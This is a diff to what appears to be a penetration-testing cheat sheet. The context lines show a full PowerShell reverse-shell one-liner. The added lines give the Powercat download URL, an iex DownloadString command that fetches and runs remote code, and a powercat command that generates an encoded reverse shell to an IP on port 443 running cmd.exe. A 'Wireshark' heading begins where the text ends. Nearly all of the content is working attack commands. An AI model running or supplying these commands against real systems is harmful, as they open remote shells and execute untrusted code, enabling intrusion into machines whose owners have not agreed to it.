@@ -243,3 +243,30 @@ $client.Close();
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip-address>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush(); }$client.Close();"
 ```
 
+------
+
+# Powercat
+
+**Source URL**
+
+```http
+https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
+```
+
+**To download in windows machine**
+
+```powershell
+iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+```
+
+**Generate Encoded Powershell Payload**
+
+```powershell
+-- example
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+```
+
+------
+
+# Wireshark
+
